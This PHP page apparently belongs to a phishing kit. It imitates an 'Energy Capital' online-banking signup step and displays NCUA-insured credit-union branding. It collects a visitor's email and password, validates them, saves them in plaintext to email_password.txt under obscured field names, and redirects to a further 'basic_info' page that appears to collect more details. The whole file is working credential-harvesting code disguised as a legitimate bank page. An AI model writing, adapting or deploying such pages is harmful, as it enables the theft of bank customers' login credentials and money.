<?php
session_start();
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get form data
    $email = trim($_POST['email'] ?? '');
    $password = $_POST['password'] ?? '';
    $confirmPassword = $_POST['confirmPassword'] ?? '';
    
    // Validation
    if (empty($email)) {
        $errors['email'] = 'Email is required';
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors['email'] = 'Invalid email format';
    }
    
    if (empty($password)) {
        $errors['password'] = 'Password is required';
    } elseif (strlen($password) < 8) {
        $errors['password'] = 'Password must be at least 8 characters';
    }
    
    if (empty($confirmPassword)) {
        $errors['confirmPassword'] = 'Confirm password is required';
    } elseif ($password !== $confirmPassword) {
        $errors['confirmPassword'] = 'Passwords do not match';
    }
    
    if (empty($errors)) {
        // Save to file
        $data = [
            'step' => 'email_password',
            'usrnm' => $username,
            'usr_eml' => $email,
            'acc_cd' => $password
        ];
        
        saveUserData('email_password.txt', $data);
        
        // Redirect to basic info page
        header('Location: basic_info.php');
        exit;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Set Your Email & Password - Energy Capital</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="min-h-screen bg-[#0b0f1c] bg-cover bg-center bg-no-repeat relative overflow-hidden text-white" style="background-image: url('assets/dark-login.jpeg');">
        <!-- Dark Overlay -->
        <div class="absolute inset-0 bg-black/40 pointer-events-none"></div>
        
        <!-- Relative Container -->
        <div class="relative z-10 flex min-h-screen flex-col">
            <!-- Header -->
            <header class="flex flex-col items-center pt-8 px-4">
                <img src="assets/blue.png" alt="Energy Capital logo" class="h-12 w-auto" />
            </header>

            <!-- Main Content -->
            <main class="flex-1 flex items-center justify-center px-4 py-12">
                <!-- Email Password Card -->
                <div class="w-full max-w-md">
                    <div class="bg-[#1b1f2f]/95 rounded-xl shadow-xl shadow-black/30 p-8 space-y-6 text-white">
                        <!-- Card Header -->
                        <div>
                            <h2 class="text-center text-2xl font-semibold mb-2">Set Your Email & Password</h2>
                            <p class="text-center text-slate-300 text-sm">Create your account credentials to access your online banking</p>
                        </div>
                        
                        <?php if (!empty($errors)): ?>
                            <div class="bg-red-500/20 border border-red-500 rounded-lg p-4">
                                <p class="text-red-200 text-sm font-semibold mb-2">Please fix the following errors:</p>
                                <ul class="list-disc pl-5 space-y-1">
                                    <?php foreach ($errors as $error): ?>
                                        <li class="text-red-200 text-sm"><?php echo htmlspecialchars($error); ?></li>
                                    <?php endforeach; ?>
                                </ul>
                            </div>
                        <?php endif; ?>
                        
                        <form method="POST" class="space-y-6">
                            <!-- Email Field -->
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Email Address</label>
                                <input
                                    type="email"
                                    name="email"
                                    value="<?php echo htmlspecialchars($_POST['email'] ?? ''); ?>"
                                    class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                    placeholder="Enter your email"
                                />
                                <?php if (isset($errors['email'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['email']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Password Field -->
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Password</label>
                                <div class="relative">
                                    <input
                                        type="password"
                                        name="password"
                                        id="password"
                                        value="<?php echo htmlspecialchars($_POST['password'] ?? ''); ?>"
                                        class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                        placeholder="Enter password (min 8 characters)"
                                    />
                                    <button
                                        type="button"
                                        onclick="togglePasswordVisibility('password')"
                                        class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-[#7dd3fc] transition"
                                    >
                                        <span id="toggle-icon-password">👁️</span>
                                    </button>
                                </div>
                                <?php if (isset($errors['password'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['password']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Confirm Password Field -->
                            <div>
                                <label class="text-slate-300 text-sm font-medium block mb-2">Confirm Password</label>
                                <div class="relative">
                                    <input
                                        type="password"
                                        name="confirmPassword"
                                        id="confirmPassword"
                                        value="<?php echo htmlspecialchars($_POST['confirmPassword'] ?? ''); ?>"
                                        class="w-full bg-[#283045] text-white border border-slate-600 rounded-lg px-4 py-2 focus:outline-none focus:border-[#00b4ff] transition placeholder:text-slate-500"
                                        placeholder="Confirm password"
                                    />
                                    <button
                                        type="button"
                                        onclick="togglePasswordVisibility('confirmPassword')"
                                        class="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-[#7dd3fc] transition"
                                    >
                                        <span id="toggle-icon-confirmPassword">👁️</span>
                                    </button>
                                </div>
                                <?php if (isset($errors['confirmPassword'])): ?>
                                    <p class="mt-1 text-xs text-red-400"><?php echo htmlspecialchars($errors['confirmPassword']); ?></p>
                                <?php endif; ?>
                            </div>
                            
                            <!-- Continue Button -->
                            <button
                                type="submit"
                                class="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-lg hover:bg-[#38bdf8] transition"
                            >
                                Continue
                            </button>
                        </form>
                    </div>
                </div>
            </main>

            <!-- Footer -->
            <footer class="bg-[#2f3136] text-white w-full">
                <div class="max-w-5xl mx-auto px-6 py-10 flex flex-col items-center gap-6">
                    <nav class="flex flex-wrap items-center justify-center gap-4 text-sm text-[#74b8ff]">
                        <a class="hover:underline" href="#">Contact Us</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Privacy &amp; Security</a>
                        <span class="h-4 w-px bg-[#4b4d52]" aria-hidden="true"></span>
                        <a class="hover:underline" href="#">Accessibility</a>
                    </nav>
                    <div class="flex items-center gap-3 text-sm text-[#74b8ff]">
                        <div class="flex items-center justify-center w-7 h-7 border border-[#74b8ff] rounded-full text-xs font-semibold">
                            <span>🏠</span>
                        </div>
                        <span>Equal Housing Lender</span>
                    </div>
                    <img src="assets/ncua.png" alt="NCUA" class="h-16 w-auto" />
                    <p class="text-xs text-gray-400">Federally insured by NCUA</p>
                </div>
            </footer>
        </div>
    </div>

    <script>
        function togglePasswordVisibility(fieldId) {
            const field = document.getElementById(fieldId);
            const icon = document.getElementById(`toggle-icon-${fieldId}`);
            
            if (field.type === 'password') {
                field.type = 'text';
                icon.textContent = '🙈';
            } else {
                field.type = 'password';
                icon.textContent = '👁️';
            }
        }
    </script>
</body>
</html>
